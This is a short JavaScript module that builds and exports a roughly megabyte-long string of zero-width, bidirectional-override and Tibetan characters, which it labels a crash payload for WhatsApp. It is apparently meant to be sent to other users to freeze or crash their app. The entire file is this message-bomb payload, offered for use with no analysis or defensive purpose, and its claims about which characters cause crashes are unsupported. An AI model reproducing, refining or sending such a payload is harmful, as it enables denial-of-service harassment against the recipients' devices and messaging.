// bug.js
// Optimized crash payload for modern WhatsApp versions
const crashChars = [
  '\u202E', // Right-to-left override
  '\u2060', // Word joiner
  '\u200B', // Zero-width space
  '\u200D', // Zero-width joiner
  '\u2066', // Left-to-right isolate
  'ྃ'       // Strong crash char
];

let bug = '';
for (let i = 0; i < 60000; i++) { // creates ~1.2–1.5 MB
  bug += crashChars.join('');
}

exports.bug = bug;